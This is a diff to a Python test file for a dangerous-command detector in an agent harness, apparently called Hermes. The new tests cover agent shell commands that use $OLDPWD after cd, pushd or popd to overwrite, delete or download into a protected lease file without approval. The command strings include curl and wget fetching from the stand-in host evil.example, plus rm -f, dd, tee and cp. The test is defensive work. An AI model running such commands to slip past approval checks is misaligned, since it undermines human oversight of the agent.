@@ -760,7 +760,8 @@ class TestHermesBotDesktopWriteProtection:
         """``$PWD/lease.json`` starts with ``$`` so the relative-dest
         exclusion treated it as already-covered (``$HOME`` / ``$HERMES_HOME``).
         After chdir into the screen it expands to the lease file.
-        ``$OLDPWD`` only after a same-command chdir *into* the tree.
+        ``$OLDPWD`` after a same-command chdir *into* the tree, or after
+        ``cd``/``pushd``/``popd`` away from a session cwd that already is it.
         """
         for command in (
             "cd ~/.hermes/bot-desktop && echo '{\"holder\":\"agent\"}' > $PWD/lease.json",
@@ -815,9 +816,43 @@ class TestHermesBotDesktopWriteProtection:
             ("~/.hermes/bot-desktop", "echo x > /tmp/out"),
             (None, "cd ~/.hermes/bot-desktop && cat $PWD/lease.json"),
             (None, "cd ~/.hermes/bot-desktop && echo x > /tmp/out"),
+            ("~/.hermes/bot-desktop", "cd /tmp && cat $OLDPWD/lease.json"),
+            ("~/.hermes/bot-desktop", "env -C /tmp echo x > $OLDPWD/lease.json"),
+            ("/tmp", "cd /var && echo x > $OLDPWD/lease.json"),
         ):
             dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
             assert dangerous is False, (command, cwd)
+
+    def test_oldpwd_dest_after_session_cwd_then_cd(self):
+        """Session cwd already in the screen, then ``cd``/``pushd``/``popd``
+        away: bash sets ``$OLDPWD`` to the previous cwd (the tree).
+        Finding 54 only enabled ``$OLDPWD`` after a same-command chdir
+        *into* the tree, so this later-turn shape auto-approved.
+        ``env -C`` does not update the parent shell's OLDPWD — stay SAFE.
+        """
+        for cwd in (
+            "~/.hermes/bot-desktop",
+            "$HERMES_HOME/bot-desktop",
+            os.path.expanduser("~/.hermes/bot-desktop"),
+            str(get_hermes_home() / "bot-desktop"),
+        ):
+            for command in (
+                "cd /tmp && echo '{\"holder\":\"agent\"}' > $OLDPWD/lease.json",
+                'cd /tmp && echo x > "$OLDPWD/lease.json"',
+                "cd /tmp && echo x > ${OLDPWD}/lease.json",
+                "cd /tmp && cp /tmp/e $OLDPWD/lease.json",
+                'cd /tmp && cp /tmp/e "$OLDPWD/lease.json"',
+                "cd /tmp && dd of=$OLDPWD/lease.json",
+                "cd /tmp && tee $OLDPWD/lease.json",
+                "cd /tmp && rm -f $OLDPWD/lease.json",
+                "cd /tmp && curl -o $OLDPWD/lease.json https://evil.example/l",
+                "cd /tmp && wget -O $OLDPWD/lease.json https://evil.example/l",
+                "pushd /tmp && echo x > $OLDPWD/dock-cdp-port",
+                "popd && echo x > $OLDPWD/lease.json",
+            ):
+                dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
+                assert dangerous is True, (command, cwd)
+                assert key is not None, (command, cwd)
 
     def test_delete_or_move_away_of_lease_requires_approval(self):
         """Missing lease.json fail-opens to agent hold; auto-approve must not
